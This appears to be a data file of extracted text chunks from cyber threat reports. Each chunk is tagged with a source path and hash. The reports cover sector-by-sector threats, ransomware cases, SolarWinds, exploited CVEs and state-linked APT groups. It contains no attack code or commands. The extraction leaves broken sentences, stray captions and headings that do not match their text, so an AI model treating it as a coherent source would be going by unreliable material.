_OTHER COMMON THREATS • Manufacturing ranks 5th among sectors with the highest risk of internal threat. Employees working in the sector are often untrained and thus considered as weak links that can be leveraged by hackers. Malicious insiders are also common in manufacturing organizations, whether they are after a fincancial or personnal objective. • Manufacturing companies represent 22% of cyber espionage victims according to Verizon. This figure demonstrate the importance of Intellectual property as a valuable asset that can be levergaed by cyber attackers."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|bfc26427865047378f653c4042d11f03
"_REVIL’S ATTACK ON JBS FOODS June, 1, 2021, The meat supplier JBS fell victim to a cyberattack by the group REvil that affected the company’s production activities in several countries. This attack led to a paralysis of servers, leading to the suspension of production lines, particularly in Australia and the United States, where several slaughterhouses suspended their activities. This attack is a landmark for the manufacturing industry as JBS supplies almost a quarter of the world’s meat. This incident resulted in a $11 million ransom being payed to REvil’s operators.

_MANUFACTURING SECTOR AND CRITICAL INFRASTRUCTURES The critical manufacturing sector is particularly at risk of being targeted by malicious actors. In December 2021, the CISA released a report tackling the issue and providing insights on the evolution of the cyberthreat for this sector. In particular, the CISA has identified vulnerabilities in ICS (Industrial Control Systems) that are even more crucial with the COVID pandemic forcing companies to adapt to remote working. Managing cybersecurity risks has become more complex, as companies are incited to resort to process automation. ICS play a key role in the securization of critical infrastructure, notably with regards to energy-related infrastructure.

_UNDERSTANDING THE CYBER THREAT With 80% of world trade by volume and 70% by value, the shipping industry is at the heart of the various supply chains, making its operation critical at the economic and strategic level. The sector’s need for efficiency has driven the maritime industry to increasingly integrate IT systems into existing OT systems, whose limited connectivity had reduced the risk of intrusion for many years. Today, the increasing digitalization of the maritime sector induces a significant cyber risk on ports, communication channels and vessels by creating opportunities for malicious actors to destroy them. _INTERWOVEN OT/IT SYSTEMS The explosion in the trade of goods by sea, the increase in carrier capacity, and industrial digitization have increased the complexity of the maritime industry environment.

ness have pushed ships and ports towards automation of systems and integration of IT with OT. Yet, by connecting these two models, the maritime industry has expanded the surface, while neglecting cybersecurity investments. The COVID 19 pandemic by inducing travel restrictions forced original equipment manufacturers (OEMs) to connect standalone systems to the internet, making them vulnerable. These OEMs have also asked port personnel to establish brief connections between the terrestrial network and their OT system in order to perform security updates. These connections, by creating entry points, expose already permeable OT systems.

The blocking of the Suez Canal by the Ever Given cargo ship symbolizes the potential damage of a cyber attack on a ship’s navigation system, resulting in the daily loss of $10 billion in trade. While an intrusion on the IT system can result in financial losses as well as reputational damage, the compromise of the OT system can have consequences on the physical safety of a ship and its crew. By taking control of a ship containing sensitive products (vaccines, liquid energy supply), an attacker has a major destructive potential that may appeal to certain malicious actors.

The first half of the year 2020, marked by the COVID-19 pandemic, has exponentially increased the cyber risk on maritime transport. In fact, over this period, attempted attacks increased by 400%. Over the three years prior to the pandemic,

April 2015 a cyberattack caused the International Frenchlanguage television channel TV5 Monde to stop broadcasting between 8 and 9 April 2015,

is a major financial and reputational risk that a media company cannot afford to take. This logic is leveraged by cyber attackers specifically targeting the sector. The average cost related to data breach for the entertainment industry stands at $4.8 millions.

High visibility as well as valuable assets that can be leveraged are enough to prompt different players to express an interest in the sector. First, the airing of audiovisual content may spark political controversies. 2014’s Sony Hack is widely believed to be the work of a North Korean APT group responding to Sony’s release of “The Interview”, a comedy movie staging the assassination of the north Korean lea-

der Kim Jong-un. State-sponsored gangs may also target the industry in a larger effort to destabilize a political adversary and excert influence. This motive is exemplified by the hack of TV5 Monde in April 2015. Hacktimism is another reason for the targeting of this sector. Indeed, individuals or groups of individuals may try to retrieve email correspondence or personal information belonging to celebrities in order to generate buzz. The most crucial threat to the sector remains financially motivated actors.

PARTY THREATS

The ecosystem is dominated by double-extortion schemes (encryption and leaks of Intellectual property (IP)), and facilitated by the decentralization of the model and the intrinsic vulnerabilities of companies working in the media and entertainment sector.

In U.S. Broadband Households

Third-party compromise is a classic tactic that is particularly applicable to the industry as media production models are built on a decentralized supply chain. Film directors, for example, delegate specific tasks such as editing, stunts, or art design to subcontractors, thus multiplying the entry points for an agile attacker. The leak of several episodes of Netflix’s series Orange is The New Black in April 2017 exemplifies this tendency as the hack originated from the compromise of a third-party entrepreneur working for the show.

_Retail

Looking at the prevalence of ransomware across all the sectors surveyed, retail, along with educa-

tion, experienced the highest level of ransomware attacks: 44% of respondents in these sectors reported being hit compared to the global average of 37%. Globally across all sectors, the percentage of organizations hit by

ransomware in the last year has dropped considerably from last year, when 51% admitted being hit. This drop can be partly explained by the evolution of attackers behaviors."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|0d1d1f9f424943cdb678cbd1db39d1dd
"_UNDERSTANDING THE CYBER THREAT The Retail industry continues to be a target for financially motivated criminals looking to cash in on the combination of payment cards and personal information. Social tactics include pretexting and phishing, with the former commonly resulting in fraudulent money transfers. Retail is one of the most targeted sectors for cyber-attacks in 2021. The coronavirus pandemic has forced retailers to adapt to survive, regardless of their size. While smaller retailers have moved to card payments and online operations, larger retailers have focused on harnessing big data to achieve efficiencies and maximize profit margins. This has introduced new threat vectors as retailers’ attack surfaces have expanded, and these vectors are being exploited by cybercriminals keen to steal money and confidential financial information. Data is the new currency for cybercriminals, who focus not just on money and goods but also customers’ personal data that can be stolen and sold online. And with high staff turnover and seasonal workers, retailers face threats from not just cybercriminals, but also insiders. _RANSOMWARE AND RETAIL SECTOR In 2021: • 44% of retail organizations were hit by ransomware • 54% of organizations hit by ransomware said the cybercriminals succeeded in encrypting their data

_RETAIL SECTOR AND THE COST OF RANSOMWARE Of the 357 respondents across all sectors who reported that their organization paid the ransom, 282 also shared the exact amount paid, including 36 in the retail sector. Globally across all sectors, the average ransom payment was $170,404. However, in retail, the average ransom payment was almost $23,000 lower, coming in at $147,811. _RETAIL SECTOR AND CRITICAL INFRASTRUCTURE Many companies in the retail sector are considered critical infrastructure. That is the case of the New Cooperative, a US based merchant wholesaler, hit by BlackMatter in September 2021. The attack was first discovered after a sample of the ransomware was downloaded from a public malware analysis site. This sample provided access to the BlackMatter ransom note, the ransomware negotiation page and a non-public data leak page containing screenshots of allegedly stolen data. Indeed, it is important to show through this attack that when the BlackMatter ransomware first appeared, the attackers stated that they would not target critical infrastructure facilities (nuclear power plants, power plants, water treatment facilities). From screenshots of the trading page shared on Twitter, the New Cooperative asked BlackMatter why they were attacked as they are considered critical infrastructure and the attack would lead to a disruption in the food supply for grain, pork and chicken."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|0f0d7d7ca2f24da4a3ac0c33dd916c6c
"BlackMatter responded that they did not «fall under the rules» and threatened to double the ransom if the New Cooperative did not change its approach to the negotiation.

Satellites are increasingly providing essential services. They have become an essential element for the successful accomplishment of military missions. Nevertheless, for a number of years, and especially with the onset of the New Space, the issue of cybersecurity in space systems has been sidelined, if not completely ignored. The reasoning was that since cyber attack techniques were not as developed as they are today, the functional and budgetary priority was not necessarily allocated to the issue of cyber security.

The Space industry is organized around several segments: • Ground Segment • Link Segment • User Segment • Space Segment"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|7fb562c40c6a42aa9e76685e8df21327
"The Space industry is organized around several segments: • Ground Segment • Link Segment • User Segment • Space Segment

_SPACE SEGMENT Once in orbit, a satellite has limited physical contact with humans, although this does not mean that security threats are not present. Vulnerabilities in the software and hardware used the satellite can arise and impact the operation of the satellite and the robustness of security controls

_GROUND SYSTEM

_USER SEGMENT

Compromising the ground station is ultimately the easiest way to control a satellite because it provides the equipment and software to legitimately control and track it. Besides, it uses existing and established ground systems and attack vectors. The types of threats are generally the same throughout the life cycle of a satellite.

Compared to the Link Segment which corresponds to the interactions between the three segments, the User Segment deals with the applications of satellite systems. Applications such as navigation, television and communications often

In reality 4 segments are to be identified: space, ground, link, and user. In the following section, we will provide examples to explain the ways in which attackers have found to target these specific segments. These examples focus mainly on use cases of state-sponsored attacker groups, but they should not suggest that organized cybercriminal gangs are not capable of acting on these threat surfaces.

"since Internet-based satellite receivers can be located anywhere in the area covered by the satellite. The only drawback is the instability of the connection and its slowness. In this case ATK13 used a very simple method: Hijacking of DVB-S satellite links. The question is, how is this possible? As Kaspersky reminds us, four basic elements are necessary:

_GROUND SEGMENT AND ATK78’S ATTACK EXAMPLE In January 2018, Symantec’s Targeted Attack Analytics TAA issued an alert for a major telecom operator in South-East Asia. The alert was linked to an attack by a group called Thrip, which collects information on satellite-operating infrastructure. To date, known targets are satellite operators in the USA and South-East Asia but also defence contractors, telecom operators and organizations processing satellite imagery. In particular, the group looks for information linked to satellite operations and geospatial imagery. Thrip’s tactics are referred to here as ‘living off the land’ and employ legitimate tools often already installed on its victims’ computers with some scripting and shell code that is hardly visible. It is therefore a dualisation of legitimate tools used by satellite operators on the ground for strategic and economic espionage.

_USER SEGMENT: DATA SPOOFING TO LURE THE USER There are many ways to spoof a GPS satellite. One way is to compromise the satellite’s receiver and alter its output signal. In 2017, the U.S. Maritime Administration reported the first GPS spoofing attack against over 20 ships in the Black Sea. Correspondence between one of the impacted vessels and their command center indicates that over the course of the attack, the GPS position displayed on their navigation tool sometimes showed ‘lost GPS fixing position’. At one point during the attack, the spoofed location showed the ship was located near the Gelendzhik airport but was in fact 25 nautical miles from the reported location. According to a non-profit organization called Resilient Navigation and Timing, which monitors GPS inci-"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|885b715be760482fbd00fb6c2b08f26a
"dents, anecdotal spoofing reports are not uncommon in Russian waters. _SPACE SEGMENT: THE RISK OF TAKEOVER Attacks on the satellites themselves are less common in recent times. Nevertheless, most of the typologies of attacks described above (living off the land tactic, links hijacking, GPS Spoofing/Jamming, etc.) can be means to reach the space segment as a final target. Here, the most important risk is a takeover or an OT attack on a satellite. In 2008 in a scientific article by Jessica A. Steinberger reported

on a Trojan horse attack that allowed hackers to break into the computer system of the Johnson Space Center in Houston, Texas. With this access they managed to reach the International Space Station (ISS) and disrupt on-board operations. This use case, which seemed unthinkable, was facilitated using old software on board with an almost non-existent patching policy for vulnerabilities.

_Transportation _UNDERSTANDING THE CYBER THREAT In the age of automation and networking, recent years have seen an overwhelming increase in cyber attacks against the transport industry. As a result of the proliferation of attackers and their modus operandi, IT systems are often too vulnerable. As a result, attackers are finding more and more entry points into increasingly vulnerable systems. In addition, in 2020, a number of global events have favoured attacks against this sector of activity, such as the COVID-19 pandemic. Indeed, in this period of coronavirus, attacking those in the second line unfortunately makes sense for malicious individuals. The transport and logistics sector fulfils vital missions and therefore needs"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|44dcdf5a37a443e7b35b9e79bd37d217
more than ever to have fully operational information systems. It is important to know that the transport sector is made up of six sub-sectors: public transport and passenger rail, pipeline systems, road and highway transport, the maritime transport system, rail freight, and postal and maritime transport. The vitality of the sector’s interconnectedness and global presence makes it a tempting target for hackers. _WHERE THE WEAKNESSES ARE: THE RAIL INDUSTRY In the rail industry, traditional wirebased train control and management systems (TCMS), which had only limited communication with external systems, are giving way to wireless standards like GSMRailway, a relatively broad network linking trains to railway regulation control centers. As is the case for|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|7415ba4f2a6747abad371e0c7a6c0d34
"all mobility providers these days, T&L companies use vehicle infotainment services and other equipment that add another layer of internet-connected communications. _WHERE THE WEAKNESSES ARE: THE MARITIME SECTOR In every segment of the transportation industry, the widened cyber-attack surface is evident. For instance, among maritime companies, relatively simple distressand-safety systems have been replaced by full-fledged, cloud-based, local area networks, like the International Maritime Organization’s (IMO) e-navigation program. These networks are a tempting target for hackers because they collect, integrate, and analyze on-board information continuously to track ships’ locations, cargo details, maintenance issues, and a host of oceanic environmental considerations.

_THE IMPACT OF CYBERCRIME IN THE TRANSPORTATION SECTOR

Blocked access to computer systems, resulting in employees using personal devices for work.

The fallout from cyber attacks can sometimes be felt by organizations for many months. In addition to service interruptions, cybercrime can also impact daily operations and result in the exposure of sensitive data. • Below are sample impacts of cyber attacks in the transportation sector: • Disruption to traffic lights, toll booths and electronic traffic signs • Interruption of ticket machines and fare gates • Blocked access to important files and data • Theft of sensitive information from emails • Interruption of payroll services • Theft of personally identifiable information (“PII”)"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|5a97f934e4ba4ea9882f8f122c1b8f9b
"_TRANSPORTATION CYBERATTACKS CAN BE DEVASTATING Transportation is the tenth most costly industry for experiencing a data breach. On average, breaches cost transit companies $3.58 million per incident and take 275 days to contain. As cyberattacks on the sector grow increasingly common, these figures could grow, leading to incredible losses. Example of devastating attack: in early May 2021, the Colonial Pipeline suffered a ransomware attack that forced it to shut down its entire network to prevent the malware from spreading.

Indeed, Colonial Pipeline, the largest oil pipeline in the United States, shut down operations after suffering what is believed to be a ransomware attack. Colonial Pipeline transports refined petroleum products between refineries on the Gulf Coast and markets in the southern and eastern United States. The company transports 2.5 million barrels per day through its 5,500-mile pipeline and supplies 45% of all fuel consumed on the East Coast

"Conclusion Protection Mitigation Appendix A: Indicators of Compromise (IOCs) Appendix B: DLL Search Order Hijacking Mitigation

Introduction The government sector, both U.S. and international, is a prime target for hackers. Attacks from organized criminals, foreign countries, political hacktivists, and others not only erode public trust in targeted government entities, but can also seriously impact government operations and the ability to deliver critical functions—not to mention the financial cost and risk to sensitive information and vital infrastructure. This all means that cyber security is a large and growing concern for governments worldwide. Increasingly, federal, state, and local governments are targets as threat actors attempt to steal or manipulate sensitive data or disrupt operations. This was highlighted in December 2020 when news emerged of the SolarWinds supply chain attack in which multiple parts of the U.S. Federal Government, NATO, the UK government, and the European Parliament were impacted. The incident, which also impacted thousands of organizations in the private sector, was reported to be among the worst cyber-espionage incidents ever suffered by the U.S.

Attacks Against the Government Sector"|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|e34f36704f794ba181e0364797c151e1
White Paper Different types of groups or individuals can initiate attacks against the government sector, and their motivations vary widely. Foreign nations may seek to obtain sensitive information about government operations; criminals may steal government employee data to hold for ransom or to sell and commit fraud; and hacktivists motivated by ideology rather than profit may seek to disrupt or gather information to further their agenda. In addition, types of attack can also vary widely, ranging from ransomware, to email-based social engineering attacks, to zero-day exploits, and supply chain attacks. What is the Government Sector? As the government sector is vast and incorporates a wide range of entities, for this paper we chose to use the Public Administration sector as defined by the North American Industry Classification System (NAICS). Sector 92: Public Administration is defined as consisting of establishments of federal, state, and local government agencies that administer, oversee, and manage public programs and have executive, legislative, or judicial authority over other institutions within a given area. Some of the key areas covered in this paper include the following: • Examples of Attacks: Some recent examples of attacks against government entities broken up into common attack types/motivations. • Who is Attacking? A look at some prominent advanced persistent threat (APT) groups with a focus on targeting the government sector.|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|349ba85c01f9424c8318c96a173f1a01
"Malicious Activity Trends: Key trends taken from Symantec, a division of Broadcom (NASDAQ: AVGO), metrics. • Case Studies: A detailed look at two cases worked on by the Symantec Threat Hunter Team. • How to Protect Your Network: Protection and mitigation information that can be used by organizations in the government sector to protect their networks.

Examples of Attacks While cyber attacks against the government sector are far too numerous to list, in recent times there have been a number of notable incidents that highlight the range of attacks this sector is subject to, as well as the various tactics employed."|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|1516c6ec0245447586da8b641f643da2
"Ransomware Argentinian Border Crossing Shut Down In August 2020, Argentina’s immigration agency (Dirección Nacional de Migraciones) suffered a ransomware attack that forced it to close the country’s border crossing. The Netwalker ransomware (Ransom.Netwalker), also known as Mailto, infected a number of servers at the immigration agency, which led to it deciding to completely shut down networks used by immigration offices and control posts. This meant that border crossings were suspended for several hours. The malware operators initially demanded a $2 million ransom, however, this increased to $4 million after the Argentinian government refused to negotiate with the criminals. Ireland’s National Health Service On May 14, 2021, Ireland’s national health service, the Health Service Executive (HSE), was hit with a ransomware attack that led to it having to shut down its IT systems. The attack impacted all its national and local services. The attack was committed by a suspected Russian cyber crime group using the Conti ransomware (Ransom.Conti). The threat actors claimed they had access to the HSE network for two weeks, stole 700 GB of unencrypted files, and demanded a $20 million ransom. The Irish government said it would not be paying any ransom. Shortly after this announcement, the Conti attackers provided a free decryptor but warned they would still publish stolen patient data online unless a ransom was paid.

"Attacks Against the Government Sector

White Paper Ireland’s Department of Health (the parent department of the HSE) was also targeted by the Conti gang. The department shut down its systems following the incident but Ireland’s Minister for Communications said that the attack “wasn’t as extensive” as the HSE attack and was intercepted earlier."|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|458f625289cd41a883852fe6b34b8b5b
Espionage SolarWinds Supply Chain Attack In mid-December 2020, news broke of the SolarWinds supply chain attack. In this particular case, rather than attacking the targets directly, the hackers compromised a third-party software provider (SolarWinds), accessing its build system and sneaking malicious code into updates to popular software Orion. By compromising the update mechanism for SolarWinds’ Orion software, the attackers were able to deliver a backdoor Trojan known as Sunburst (Backdoor.Sunburst). While thousands of organizations downloaded the Trojanized software update, the attackers were only interested in a relatively small selection. The nature of supply chain attacks mean they are indiscriminate, with any user of the compromised software at risk of infection. The attackers then get to pick and choose from the infected organizations, focusing on high-value targets for, in this case, the purpose of espionage. A number of key U.S. federal agencies downloaded the malicious update, including the Department of Commerce, the Department of Homeland Security, the Treasury Department, and the Justice Department. The Justice Department later revealed that around 3% of its Office 365 mailboxes had been accessed by the attackers behind the attack. NATO, the UK government, and the European Parliament were also impacted by the SolarWinds attack.|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|ff75b6817d5944818e2c9713ca2ffb0d
In April 2021, three months after news first broke of the attack, the U.S. government said that SVR, the Russian Foreign Intelligence Service (aka Fritillary, APT 29, Cozy Bear) was responsible for the SolarWinds attack. The U.S. imposed wide-ranging sanctions against Russia as a response. Symantec carried out extensive research into the SolarWinds attack, including detailed analysis of additional malware (Teardrop and Raindrop) used by the attackers and insights into the command and control process used. All this research, along with protection information, can be found on our dedicated blog page. Dragonfly Exploiting Known Vulnerabilities In October 2020, the Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) released a joint statement revealing attacks carried out by a Russian state-sponsored hacking group against U.S. government networks. The hacking group was Dragonfly (aka Energetic Bear, Berserk Bear, Crouching Yeti, Koala). The attackers had been targeting dozens of state and local government networks since at least February 2020. The group successfully compromised network infrastructure and exfiltrated data from at least two victim servers by combining exploits for known VPN appliances and Windows vulnerabilities. The hackers used the vulnerabilities to breach networking gear, pivot to internal networks, elevate privileges, and steal sensitive data.|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|9449dda8ad30406ca43e5378f0301b46
"Targeted devices included Citrix access gateways (CVE-2019-19781), Microsoft Exchange email servers (CVE-2020-0688), Exim mail agents (CVE 2019-10149), and Fortinet SSL VPNs (CVE-2018-13379). To move laterally across compromised networks, the attackers used the Zerologon elevation-of-privilege vulnerability in Windows Servers (CVE-2020-1472) to access and steal Windows Active Directory (AD) credentials.

Denial of Service Belgian Government Knocked Offline by DDoS Attack In May 2021, Belgium’s government was hit with a major distributed denial of service (DDoS) attack that knocked most of its network offline, including public-facing websites and internal systems. The attack targeted Belnet, a state-owned ISP that provides connectivity and infrastructure for the country’s government and public sector organizations. At least 200 public organizations were affected by the attack, including the country’s tax portal, remote learning systems used by schools, and its COVID vaccine registration portal.

Attacks Against the Government Sector

White Paper While the attack has yet to be attributed to anyone, several Belgian politicians and political observers suggested that the incident may have been politically motivated."|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|d101fe4a3c7c4d64be6bef3c2ea6aedc
Who is Attacking? As well as ransomware actors out for financial gain and hacktivists with a goal of making political statements, advanced persistent threat (APT) groups are one of the biggest threats to the government sector. These highly skilled and typically state-sponsored threat actors are well resourced and use sophisticated hacking techniques to gain access to target networks. Because of the level of effort needed to carry out these attacks, APTs are usually leveled at high-value targets, such as those in the government sector. The following selection of advanced persistent threat (APT) groups have been known to target the government sector. Each APT group is listed under the nation state it is believed to receive direction and support from.|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|4272d76fc0164705ae3e2b78c0ffa1ff
Iran Crambus Believed to have been active since at least 2014, Crambus (aka APT34, Oilrig, Twisted Kitten) is known to have targeted government agencies, financial institutions, and technology companies in Saudi Arabia, Israel, the United Arab Emirates (UAE), Lebanon, Kuwait, Qatar, the U.S., and Turkey. The group delivers a custom backdoor known as Heherminth via spear-phishing attacks, targeting individuals within organizations of interest using malicious Office documents with embedded macros to install a backdoor. The group may also send emails containing links to websites registered by the attackers and employ social-engineering tactics to trick victims into downloading and installing the backdoor. The goal of the group is cyber espionage, focusing on reconnaissance efforts to benefit Iranian nation-state interests.|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|dae6961343454f49ae68e1ecf73b0083
"China Cicada The Chinese government-linked group known as Cicada (aka APT10, Stone Panda, Cloud Hopper) has been active since at least 2009 and is believed to be involved in espionage-type operations. Cicada traditionally customizes publicly available malware in concert with dual-use tools during operations. The group leverages a number of techniques during the initial stages of attack, such as targeted email, strategic website compromise, and supply chain attacks. Cicada is known to target numerous sectors, including government, aerospace, energy, engineering, financial, healthcare, IT, manufacturing, media, and research. The group is known to target the following regions: Australia, China, Hong Kong, Japan, Taiwan, the UK, and the U.S. However, since 2016, Cicada appears to have mainly focused on targeting organizations in Japan across numerous sectors, including government, media, research, and transport. In November 2020, Symantec uncovered evidence that Cicada was behind a large-scale attack campaign targeting multiple Japanese companies, including subsidiaries located in as many as 17 regions around the globe in a likely intelligence-gathering operation.

"Attacks Against the Government Sector

White Paper Cicada is known to use a combination of generally available malware and tools during operations, including the following: • Backdoor.Darkmoon (Specific configurations) • Backdoor.ChChes (Exclusively used) • Backdoor.Korplug (Specific configurations) • Trojan.Redleavy (Exclusively used) • Trojan.Wimhop (A modified version of wmiexec.vbs available on GitHub) • Backdoor.Hartip • Tcping (Publically available tool to check connectivity) • Csvde (Microsoft tool for Active Directory) • PsExec (Microsoft tool for executing commands/files on a remote host) • Netsess (Publically available tool to enumerate NetBIOS sessions) • Trojan.Agentemis (aka Cobalt Strike) Budworm Budworm (aka APT27, Lucky Mouse, Emissary Panda) has been active since at least July 2013. The Chinese government-linked group uses the malware families Backdoor.Korplug, Trojan.Browrat, and Hyperbro in its attacks. Budworm has been known to leverage strategic website compromises and spear-phishing attacks to target victims in the aerospace, defense, government, and technology industries. According to ESET, in early 2021 Budworm began exploiting several Microsoft Exchange Server zero-day vulnerabilities. The group targeted multiple government networks in the Middle East and wider organizations in Central Asia for the purpose of cyber espionage."|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|4b4c0824eca94d6ead8d77cbea5dfc6e
"The group used the email server access, and the compromise of Microsoft SharePoint, to deploy a newly updated modular toolkit known as SysUpdate, which is designed to provide on-demand malicious capabilities.

Russia Swallowtail Swallowtail (aka APT28, Sofacy, Fancy Bear, Tsar Team, Sednit) is believed to be a Russian cyber espionage group that has been active since at least January 2007. The group was initially known for traditional, information-stealing espionage campaigns, targeting governments in the U.S. and Europe. It became involved in more overt, disruptive operations in the run-up to the 2016 U.S. presidential election. The group has been known to employ a variety of methods to gain access to targeted organizations’ networks. These include spear-phishing emails, watering hole websites, infected storage devices, and exploitation of software vulnerabilities, including zero-day vulnerabilities. During the 2016 U.S. presidential election attacks, APT28 used spear-phishing emails that tricked recipients into supposedly changing their email passwords on a fake webmail domain. The group then used these stolen credentials to gain access to email accounts and steal the contents. This information was later leaked. Symantec has seen APT28 use a number of custom malware tools, including: • Infostealer.Sofacy • OSX.Sofacy • Trojan.Sofacy • Trojan.Modruner

"Attacks Against the Government Sector

White Paper In December 2020, the Norwegian police secret service (PST) stated that it believed Swallowtail was likely responsible for hacking the email accounts of the Norwegian Parliament (Stortinget). In the attack, which took place in August 2020, the hackers gained access to the Parliament’s email system and accessed inboxes for Stortinget employees and elected officials. Fritillary Fritillary (aka APT29, Cozy Bear, the Dukes) is believed to be a Russian cyber espionage group and has been active since at least January 2010. Like APT28, it initially confined itself to spying campaigns, focusing on governments, the military, and think tanks in the U.S. and Europe. It later became involved in more subversive operations and was implicated (along with APT28) in disruptive attacks prior to the 2016 U.S. presidential election. APT29 usually relies on spear-phishing emails to gain access to targeted organizations’ networks. During the 2016 U.S. presidential election attacks, APT29 sent spear-phishing emails to more than 1,000 targeted individuals, including some U.S. government personnel. These emails contained malicious links which, if clicked, would lead to malware being installed on the target’s computer. This allowed APT29 to compromise a political party’s systems and steal emails from several accounts on the network."|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|58065383eaf840a0ad94710075481ea3
Symantec has seen APT29 use a number of custom malware tools, including: • Trojan.Cozer • Trojan.Seaduke • Trojan.Dionisduke • Backdoor.Netduke • Trojan.Powerduke • Backdoor.Miniduke More recently, the Federal Bureau of Investigation (FBI), the U.S. Department of Homeland Security (DHS), and the Cybersecurity and Infrastructure Security Agency (CISA) warned of continued attacks coordinated by the Russian Foreign Intelligence Service (SVR) (aka Fritillary) against U.S. and foreign organizations. The agencies said this activity, which included the SolarWinds Orion supply chain compromise (see Examples of Attacks), primarily targets government networks, think tank and policy analysis organizations, and information technology companies and seeks to gather intelligence information. For more information on the Swallowtail and Fritillary groups, read our blog Subverting Democracy: How Cyber Attackers Try to Hack the Vote.|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|2c95c45e21594030b4b11ac807100905
"North Korea Springtail Springtail (aka Kimsuky, Thallium, Nickle Foxcroft) has been active since at least 2012. The group is believed to be operating on behalf of the North Korean government. Springtail uses the malware families Trojan.Destfallen, Trojan.Kisuky, and Bloodhound.hwp.5 in its attacks. The group is known to use social engineering tactics, spear-phishing emails, and watering hole attacks to compromise its victims in order to gain intelligence on various topics of interest to the North Korean government. Springtail targets individuals and organizations in South Korea, Japan, and the U.S. Springtail specifically targets individuals identified as experts in various fields, think tanks, and South Korean government entities. The group focuses its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions. In September 2020 it was reported that Springtail attempted to hack 11 officials of the United Nations Security Council.

"Attacks Against the Government Sector

White Paper In November 2020, Cybereason identified a new modular spyware suite dubbed KGH_SPY and a new malware strain dubbed CSPY Downloader being employed in attacks by Springtail. The group was observed targeting a wide array of victim organizations in the U.S., Europe, Japan, South Korea, and Russia. The target organizations included pharmaceutical and research companies working on COVID-19 therapies, government and defense organizations, journalists, and various human rights groups.

Malicious Activity Trends In order to assess general levels of malicious activity, we examined telemetry from 1,100 government customers over the past 15 months, namely all of 2020 and the first quarter of 2021. Figure 1: Malware Detections by Month, January 2020 to April 2021

Malware detections in these organizations trended downwards in this time period. While the trend is welcome news, it shouldn’t be cause for complacency since the decline was relatively small. Secondly, the biggest sources of risk to government organizations—espionage and ransomware—tend to be low prevalence but high impact threats."|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|42ac89a6f51b489bbd79aa43b53d1b59
"Ransomware While the number of ransomware detections is showing a downward trend, this can be misleading as the number of victims is still considerable and, due to changing tactics from ransomware operators, the impact from successful attacks can be devastating. It should also be noted that the data shown in Figure 1 is only a representative sample of the overall number of attacks involving ransomware. Most targeted ransomware operators, for example, recompile their ransomware for every new attack. This means that the variant of the ransomware used in an attack may be blocked by a generic or machine learning-generated detection signature rather than a detection linked to that ransomware family.

While in the past attackers were content with encrypting a victim organization’s files, now most of the leading ransomware operators are stealing data prior to encryption and using it to increase the pressure on victims to pay up. The threat actors threaten to release the stolen data or sell it to the highest bidder if the victim doesn’t pay a ransom. Some ransomware gangs that have carried out ransomware attacks employing these tactics include the following: Maze The now-defunct Maze ransomware gang was the first ransomware gang to adopt the tactic of exfiltrating data from victim organizations prior to encryption and threatening to release this data unless the ransom is paid. Maze also operated as a ransomware-as-a-service (RaaS), providing the malware to affiliates and sharing a portion of profits made from successful attacks. In September 2020, Maze targeted Fairfax County Public Schools (FCPS). The school was just one of the U.S. public sector organizations hit by Maze since it first appeared in May 2019. Maze published 100 MB of data in an effort to pressure FCPS into paying a ransom. The ransomware gang said that the data represented just 2% of the total amount stolen during the attack. Maze shut down operation shortly after the FCPS attack, with many of its affiliates at the time moving to the newly emerging Egregor RaaS."|data_input/Oilrig_reports/entry_5c5721a1-bd1a-4fd4-b8f5-42f4a86136c2.text|b0ea90b9dc434f0db50bd26572862a70
"Babuk In April 2021, the Babuk ransomware gang targeted Washington DC’s Police Department and posted screenshots of some of the 250 GB of data it allegedly stole. The screenshots published by Babuk appeared to contain folders relating to police operations, DC gangs, and police disciplinary records. Babuk even claimed to have files relating to arrests following the storming of the U.S. Capitol building on January 6.

"Attacks Against the Government Sector

